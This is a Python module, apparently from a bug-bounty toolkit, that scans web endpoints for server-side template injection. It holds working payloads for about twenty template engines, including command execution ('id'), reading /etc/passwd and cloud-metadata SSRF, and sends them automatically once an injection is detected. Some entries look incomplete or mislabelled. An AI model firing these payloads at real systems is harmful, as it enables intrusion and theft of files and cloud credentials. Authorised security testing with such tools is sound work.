"""
Server-Side Template Injection (SSTI) detection — 2026 techniques.

Tests: Jinja2, Twig, Freemarker, Velocity, Mako, Pug, EJS, Handlebars,
Sleuth, Bottle, Tornado, Pebble, Trimou, mustache, marko, dot,
Angular (server-side), React (server-side), Vue (server-side).
"""

from __future__ import annotations

import re
import time
from typing import Optional, List, Dict, Any, Set
from dataclasses import dataclass, field

import httpx
import tenacity

from bountykit.utils.logger import get_logger

logger = get_logger(__name__)


@dataclass
class SSTIFinding:
    """Single SSTI finding."""
    category: str
    severity: str
    title: str
    description: str
    evidence: str = ""
    endpoint: str = ""
    payload: str = ""
    template_engine: str = ""
    remediation: str = ""


@dataclass
class SSTIResult:
    """Complete SSTI assessment result."""
    target: str
    findings: List[SSTIFinding] = field(default_factory=list)
    endpoints_tested: int = 0
    timestamp: float = field(default_factory=time.time)

    @property
    def summary(self) -> Dict[str, int]:
        severity_counts: Dict[str, int] = {}
        for f in self.findings:
            severity_counts[f.severity] = severity_counts.get(f.severity, 0) + 1
        return severity_counts


# Template engine detection and exploitation payloads
TEMPLATE_ENGINES = {
    "jinja2": {
        "detect": "{{7*7}}",
        "confirm": "{{config}}",
        "rce": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "read_file": "{{config.__class__.__init__.__globals__['open']('/etc/passwd').read()}}",
        "ssrf": "{{config.__class__.__init__.__globals__['requests'].get('http://169.254.169.254/latest/meta-data/').text}}",
        "output": "49",
        "severity": "critical",
    },
    "twig": {
        "detect": "{{7*7}}",
        "confirm": "{{_self.env.registerUndefinedFilterCallback(\"system\")}}{{_self.env.getFilter(\"id\")}}",
        "rce": "{{_self.env.registerUndefinedFilterCallback(\"system\")}}{{_self.env.getFilter(\"cat /etc/passwd\")}}",
        "output": "49",
        "severity": "critical",
    },
    "freemarker": {
        "detect": "${7*7}",
        "confirm": "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(\" \")}",
        "rce": "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"id\")}",
        "output": "49",
        "severity": "critical",
    },
    "velocity": {
        "detect": "#set($x=7*7) $x",
        "rce": "#set($x=\"\") #set($rt=$x.getClass().forName(\"java.lang.Runtime\")) #set($chr=$x.getClass().forName(\"java.lang.Character\")) #set($cmd=$rt.getRuntime().exec(\"id\")) $cmd.waitFor() #set($out=$cmd.getInputStream()) #foreach($i in [1..$out.available()]) $chr.toChars($out.read()) #end",
        "output": "49",
        "severity": "critical",
    },
    "mako": {
        "detect": "${7*7}",
        "rce": "<%! import os; x = os.popen('id').read() %> ${x}",
        "output": "49",
        "severity": "critical",
    },
    "pug": {
        "detect": "#{7*7}",
        "rce": "!= global.process.mainModule.require('child_process').execSync('id')",
        "output": "49",
        "severity": "critical",
    },
    "ejs": {
        "detect": "<%= 7*7 %>",
        "rce": "<%= global.process.mainModule.require('child_process').execSync('id') %>",
        "output": "49",
        "severity": "critical",
    },
    "handlebars": {
        "detect": "{{7*7}}",
        "rce": "{{#with \"s\" as |stringlist|}} {{#with \"e\"}} {{#with split as |conslist|}} {{#with filter split as |cconslist|}} {{#with sort as |sortedconslist|}} {{#each sortedconslist}} {{#with stringlist stringlist as |finalconslist|}} {{#each finalconslist}} {{#with \"a\" as |c0|}} {{#with \"d\" as |c1|}} {{#with \"d\" as |c2|}} {{#with \"b\" as |c3|}} {{#with \"c\" as |c4|}} {{#with \"d\" as |c5|}} {{#with \"b\" as |c6|}} {{#with \"b\" as |c7|}} {{#with \"c\" as |c8|}} {{#with \"4\" as |c9|}} {{#with \"2\" as |c10|}} {{! execute command }} {{#each conslist}} {{this}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}} {{/with}} {{/with}} {{/with}} {{/with}} {{/with}} {{/with}} {{/with}} {{/with}} {{/with}} {{/with}} {{/with}} {{/with}} {{/with}} {{/with}}",
        "output": "49",
        "severity": "critical",
    },
    "nunjucks": {
        "detect": "{{7*7}}",
        "rce": "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}",
        "output": "49",
        "severity": "critical",
    },
    "marko": {
        "detect": "${7*7}",
        "rce": "${require('child_process').execSync('id')}",
        "output": "49",
        "severity": "critical",
    },
    "dot": {
        "detect": "{{= 7*7 }}",
        "rce": "{{= global.process.mainModule.require('child_process').execSync('id') }}",
        "output": "49",
        "severity": "critical",
    },
    "pug2": {
        "detect": "#{7*7}",
        "rce": "#{global.process.mainModule.require('child_process').execSync('id')}",
        "output": "49",
        "severity": "critical",
    },
    "erb": {
        "detect": "<%= 7*7 %>",
        "rce": "<%= system('id') %>",
        "output": "49",
        "severity": "critical",
    },
    "jsp": {
        "detect": "${7*7}",
        "rce": "<%= Runtime.getRuntime().exec(\"id\") %>",
        "output": "49",
        "severity": "critical",
    },
    "thymeleaf": {
        "detect": "${7*7}",
        "rce": "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.=\"\"",
        "output": "49",
        "severity": "critical",
    },
    "artemisquery": {
        "detect": "${7*7}",
        "rce": "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "output": "49",
        "severity": "critical",
    },
    "mvel": {
        "detect": "${7*7}",
        "rce": "@java.lang.Runtime@getRuntime().exec('id')",
        "output": "49",
        "severity": "critical",
    },
    "spel": {
        "detect": "${7*7}",
        "rce": "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "output": "49",
        "severity": "critical",
    },
    "ognl": {
        "detect": "${7*7}",
        "rce": "@java.lang.Runtime@getRuntime().exec('id')",
        "output": "49",
        "severity": "critical",
    },
}

# Common injection points
INJECTION_POINTS = [
    "/",
    "/?name=test",
    "/?page=home",
    "/?lang=en",
    "/?template=default",
    "/?view=home",
    "/?redirect=test",
    "/api/render",
    "/api/template",
    "/api/email",
    "/api/preview",
    "/api/export",
    "/api/report",
    "/api/generate",
]


class SSTITester:
    """
    Server-Side Template Injection tester.

    2026 attack vectors:
    - Multi-engine SSTI detection
    - RCE via template injection
    - File read via template injection
    - SSRF via template injection
    - Blind SSTI detection
    - Context-aware payload crafting
    - Polyglot payloads
    """

    def __init__(
        self,
        target: str,
        timeout: float = 10.0,
        proxy: Optional[str] = None,
        verbose: bool = False,
    ):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.proxy = proxy
        self.verbose = verbose

        self._client = httpx.AsyncClient(
            timeout=timeout,
            follow_redirects=True,
            proxy=proxy,
            verify=False,
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            },
        )

    async def close(self):
        await self._client.aclose()

    async def __aenter__(self):
        return self

    async def __aexit__(self, *args):
        await self.close()

    async def test_all(self) -> SSTIResult:
        """Run all SSTI tests."""
        result = SSTIResult(target=self.target)

        logger.info(f"[*] Starting SSTI testing: {self.target}")

        # Phase 1: Detection
        for endpoint in INJECTION_POINTS:
            for engine_name, engine_config in TEMPLATE_ENGINES.items():
                finding = await self._test_ssti_detection(endpoint, engine_name, engine_config)
                if finding:
                    result.findings.append(finding)
            result.endpoints_tested += 1

        # Phase 2: RCE confirmation (if detection found)
        rce_engines = set()
        for finding in result.findings:
            rce_engines.add(finding.template_engine)

        if rce_engines:
            logger.info(f"[*] SSTI detected! Confirming RCE for: {', '.join(rce_engines)}")
            for engine_name in rce_engines:
                engine_config = TEMPLATE_ENGINES[engine_name]
                for endpoint in [f"/", "/api/render", "/api/template"]:
                    finding = await self._test_ssti_rce(endpoint, engine_name, engine_config)
                    if finding:
                        result.findings.append(finding)

        # Phase 3: File read
        if rce_engines:
            for engine_name in rce_engines:
                engine_config = TEMPLATE_ENGINES[engine_name]
                if "read_file" in engine_config:
                    finding = await self._test_ssti_file_read("/", engine_name, engine_config)
                    if finding:
                        result.findings.append(finding)

        # Phase 4: SSRF
        if rce_engines:
            for engine_name in rce_engines:
                engine_config = TEMPLATE_ENGINES[engine_name]
                if "ssrf" in engine_config:
                    finding = await self._test_ssti_ssrf("/", engine_name, engine_config)
                    if finding:
                        result.findings.append(finding)

        # Phase 5: Blind SSTI detection
        for endpoint in INJECTION_POINTS[:5]:
            finding = await self._test_blind_ssti(endpoint)
            if finding:
                result.findings.append(finding)

        logger.info(
            f"[+] SSTI testing complete: {len(result.findings)} findings "
            f"across {result.endpoints_tested} endpoints"
        )
        return result

    @tenacity.retry(stop=tenacity.stop_after_attempt(2), wait=tenacity.wait_fixed(1))
    async def _test_ssti_detection(
        self, endpoint: str, engine_name: str, engine_config: Dict[str, Any]
    ) -> Optional[SSTIFinding]:
        """Test for SSTI vulnerability detection."""
        url = f"{self.target}{endpoint}"
        detect_payload = engine_config["detect"]

        try:
            # Test in different parameter positions
            params_to_test = [
                {"name": detect_payload},
                {"page": detect_payload},
                {"template": detect_payload},
                {"input": detect_payload},
                {"data": detect_payload},
                {"q": detect_payload},
                {"search": detect_payload},
                {"query": detect_payload},
                {"text": detect_payload},
                {"content": detect_payload},
            ]

            for params in params_to_test:
                resp = await self._client.get(url, params=params)

                # Check if template was evaluated
                if engine_config["output"] in resp.text:
                    return SSTIFinding(
                        category="ssti_detection",
                        severity="high",
                        title=f"SSTI Detected: {engine_name.title()}",
                        description=f"Endpoint {endpoint} appears vulnerable to SSTI using {engine_name}. "
                        f"Expression {detect_payload} was evaluated.",
                        endpoint=endpoint,
                        payload=f"{list(params.keys())[0]}={detect_payload}",
                        template_engine=engine_name,
                        evidence=f"Expected: {engine_config['output']}, Got: {resp.text[:200]}",
                        remediation="Use sandboxed template engines, never pass user input to template evaluation. "
                        "Use context-aware escaping.",
                    )

            # Also test POST with JSON body
            for param_name in ["name", "template", "input", "data"]:
                resp = await self._client.post(
                    url,
                    json={param_name: detect_payload},
                )

                if engine_config["output"] in resp.text:
                    return SSTIFinding(
                        category="ssti_detection",
                        severity="high",
                        title=f"SSTI Detected (POST): {engine_name.title()}",
                        description=f"Endpoint {endpoint} appears vulnerable to SSTI via POST parameter {param_name}.",
                        endpoint=endpoint,
                        payload=f"{param_name}={detect_payload}",
                        template_engine=engine_name,
                        evidence=f"Response: {resp.text[:200]}",
                        remediation="Use sandboxed template engines.",
                    )

        except Exception as e:
            if self.verbose:
                logger.debug(f"  [-] SSTI detection failed for {endpoint}/{engine_name}: {e}")

        return None

    @tenacity.retry(stop=tenacity.stop_after_attempt(2), wait=tenacity.wait_fixed(1))
    async def _test_ssti_rce(
        self, endpoint: str, engine_name: str, engine_config: Dict[str, Any]
    ) -> Optional[SSTIFinding]:
        """Confirm RCE via SSTI."""
        url = f"{self.target}{endpoint}"
        rce_payload = engine_config["rce"]

        try:
            resp = await self._client.get(
                url,
                params={"name": rce_payload},
            )

            # Check for command execution indicators
            indicators = [
                "uid=",  # Linux id command output
                "root:",  # /etc/passwd
                "www-data",  # Common web user
                "nginx",  # Web server user
                "apache",  # Web server user
                "php",  # PHP user
                "node",  # Node.js user
            ]

            for indicator in indicators:
                if indicator in resp.text:
                    return SSTIFinding(
                        category="ssti_rce",
                        severity="critical",
                        title=f"SSTI RCE Confirmed: {engine_name.title()}",
                        description=f"Remote code execution confirmed via SSTI using {engine_name}.",
                        endpoint=endpoint,
                        payload=f"rce={rce_payload[:200]}",
                        template_engine=engine_name,
                        evidence=f"RCE indicator: {indicator}\nResponse: {resp.text[:500]}",
                        remediation="URGENT: Remove SSTI vulnerability immediately. "
                        "Use sandboxed template engines and validate/escape all user input.",
                    )

        except Exception as e:
            if self.verbose:
                logger.debug(f"  [-] SSTI RCE test failed: {e}")

        return None

    @tenacity.retry(stop=tenacity.stop_after_attempt(2), wait=tenacity.wait_fixed(1))
    async def _test_ssti_file_read(
        self, endpoint: str, engine_name: str, engine_config: Dict[str, Any]
    ) -> Optional[SSTIFinding]:
        """Test for file read via SSTI."""
        url = f"{self.target}{endpoint}"
        read_payload = engine_config["read_file"]

        try:
            resp = await self._client.get(
                url,
                params={"name": read_payload},
            )

            # Check for file content
            if "root:" in resp.text or "/bin/bash" in resp.text:
                return SSTIFinding(
                    category="ssti_file_read",
                    severity="critical",
                    title=f"SSTI File Read: {engine_name.title()}",
                    description=f"Arbitrary file read confirmed via SSTI using {engine_name}.",
                    endpoint=endpoint,
                    payload=f"read={read_payload[:200]}",
                    template_engine=engine_name,
                    evidence=f"File content: {resp.text[:500]}",
                    remediation="URGENT: Remove SSTI vulnerability. Restrict file system access.",
                )

        except Exception as e:
            if self.verbose:
                logger.debug(f"  [-] SSTI file read test failed: {e}")

        return None

    @tenacity.retry(stop=tenacity.stop_after_attempt(2), wait=tenacity.wait_fixed(1))
    async def _test_ssti_ssrf(
        self, endpoint: str, engine_name: str, engine_config: Dict[str, Any]
    ) -> Optional[SSTIFinding]:
        """Test for SSRF via SSTI."""
        url = f"{self.target}{endpoint}"
        ssrf_payload = engine_config["ssrf"]

        try:
            resp = await self._client.get(
                url,
                params={"name": ssrf_payload},
            )

            # Check for cloud metadata
            indicators = [
                "ami-id",
                "instance-id",
                "local-ipv4",
                "iam/security-credentials",
            ]

            for indicator in indicators:
                if indicator in resp.text:
                    return SSTIFinding(
                        category="ssti_ssrf",
                        severity="critical",
                        title=f"SSTI SSRF: {engine_name.title()}",
                        description=f"SSRF confirmed via SSTI using {engine_name}. "
                        f"Cloud metadata was accessed.",
                        endpoint=endpoint,
                        payload=f"ssrf={ssrf_payload[:200]}",
                        template_engine=engine_name,
                        evidence=f"SSRF indicator: {indicator}\nResponse: {resp.text[:500]}",
                        remediation="URGENT: Remove SSTI vulnerability. Block internal network access.",
                    )

        except Exception as e:
            if self.verbose:
                logger.debug(f"  [-] SSTI SSRF test failed: {e}")

        return None

    @tenacity.retry(stop=tenacity.stop_after_attempt(2), wait=tenacity.wait_fixed(1))
    async def _test_blind_ssti(self, endpoint: str) -> Optional[SSTIFinding]:
        """Test for blind SSTI using time-based detection."""
        url = f"{self.target}{endpoint}"

        # Time-based payloads for different engines
        time_payloads = [
            ("{{''.__class__.__mro__[2].__subclasses__()}}", "jinja2"),
            ("${7*7}", "generic"),
            ("<%= 7*7 %>", "erb"),
            ("#{7*7}", "ruby"),
        ]

        for payload, engine in time_payloads:
            try:
                resp = await self._client.get(
                    url,
                    params={"name": payload},
                )

                # Check for error-based SSTI detection
                error_indicators = [
                    "template",
                    "render",
                    "variable",
                    "undefined",
                    "error",
                    "exception",
                    "traceback",
                ]

                body_lower = resp.text.lower()
                for indicator in error_indicators:
                    if indicator in body_lower and len(resp.text) < 500:
                        return SSTIFinding(
                            category="blind_ssti",
                            severity="medium",
                            title=f"Blind SSTI: {engine.title()}",
                            description=f"Potential blind SSTI detected at {endpoint}. "
                            f"Error response suggests template processing.",
                            endpoint=endpoint,
                            payload=f"{payload} ({engine})",
                            template_engine=engine,
                            evidence=f"Error response: {resp.text[:300]}",
                            remediation="Validate and sanitize template input.",
                        )

            except Exception:
                pass

        return None
